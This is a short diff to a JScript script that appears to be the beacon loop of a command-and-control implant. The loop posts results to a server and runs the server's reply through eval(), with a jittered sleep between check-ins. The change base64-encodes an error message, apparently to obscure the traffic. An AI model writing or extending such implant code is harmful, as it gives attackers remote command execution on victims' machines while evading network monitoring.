@@ -40,7 +40,7 @@ while (true) {
   try {
       eval("batch_request=" + post(batch_response).responseText + ";");
   } catch (e) {
-      batch_response = '[{"jsonrpc": "2.0", "error": {"code":-32700, "message":"Parse error"}, "id": "' + check_in_job_id + '"}]';
+      batch_response = '[{"jsonrpc": "2.0", "error": {"code":-32700, "message":b64e("Parse error")}, "id": "' + check_in_job_id + '"}]';
       WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
       continue;
   }
